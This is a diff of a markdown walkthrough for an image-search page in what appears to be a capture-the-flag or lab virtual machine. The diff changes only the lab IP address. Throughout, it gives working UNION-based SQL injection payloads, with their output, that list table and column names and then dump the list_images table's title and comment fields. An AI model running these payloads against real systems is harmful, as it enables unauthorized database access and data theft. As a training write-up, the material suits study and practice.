@@ -1,18 +1,18 @@
 # Searching Page
 
-__http://192.168.99.101/?page=searchimg&Submit=Submit__
+__http://192.168.56.101/?page=searchimg&Submit=Submit__
 
 ## Description
 This is a page for searching over the images. 
 
 ## Form Outputs
-we can select for table names as in previous task [select table_name, 0 from information_schema.tables where table_schema=database()](#http://192.168.99.101/?page=searchimg&id=-1%20union%20select%20table_name,%200%20from%20information_schema.tables%20where%20table_schema=database()&Submit=Submit)
+we can select for table names as in previous task [select table_name, 0 from information_schema.tables where table_schema=database()](#http://192.168.56.101/?page=searchimg&id=-1%20union%20select%20table_name,%200%20from%20information_schema.tables%20where%20table_schema=database()&Submit=Submit)
 ```
 ID: -1 union select table_name, 0 from information_schema.tables where table_schema=database() 
 Title: 0
 Url : list_images
 ```
-we can select for column names as in previous task [select column_name, column_type from information_schema.columns where table_schema=database()](#http://192.168.99.101/?page=searchimg&id=-1%20union%20select%20column_name,%20column_type%20from%20information_schema.columns%20where%20table_schema=database()&Submit=Submit)
+we can select for column names as in previous task [select column_name, column_type from information_schema.columns where table_schema=database()](#http://192.168.56.101/?page=searchimg&id=-1%20union%20select%20column_name,%20column_type%20from%20information_schema.columns%20where%20table_schema=database()&Submit=Submit)
 ```
 ID: -1 union select column_name, column_type from information_schema.columns where table_schema=database() 
 Title: int(11)
@@ -27,7 +27,7 @@ ID: -1 union select column_name, column_type from information_schema.columns whe
 Title: varchar(255)
 Url : comment
 ```
-we can select sensetive data as in previous task [select title, comment from list_images](#http://192.168.99.101/?page=searchimg&id=-1%20union%20select%20title,%20comment%20from%20list_images&Submit=Submit)
+we can select sensetive data as in previous task [select title, comment from list_images](#http://192.168.56.101/?page=searchimg&id=-1%20union%20select%20title,%20comment%20from%20list_images&Submit=Submit)
 ```
 ID: -1 union select title, comment from list_images 
 Title: An image about the NSA !
